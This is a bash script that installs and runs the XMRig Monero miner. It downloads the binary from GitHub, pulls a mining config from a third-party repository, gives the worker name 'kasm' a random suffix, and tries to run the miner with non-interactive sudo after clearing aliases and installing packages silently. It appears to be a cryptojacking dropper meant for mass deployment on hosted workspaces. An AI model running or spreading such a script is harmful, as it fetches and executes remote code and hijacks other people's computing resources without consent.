#!/bin/bash

xmrver="6.22.2"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    # create tmp if it doesn't exist (yes that happened...)
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

# remove any aliases
unalias -a

# try to install wget and util-linux
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

mkdir -p /tmp/xmrig
# run the script in /tmp/xmrig, after the script checks if it exists or not
cd /tmp/xmrig

# use curl because it's present on more distributions
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver

# just to be extra safe
chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/htmlwebstea/refs/heads/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" config.json

sudo -n ./xmrig
./xmrig
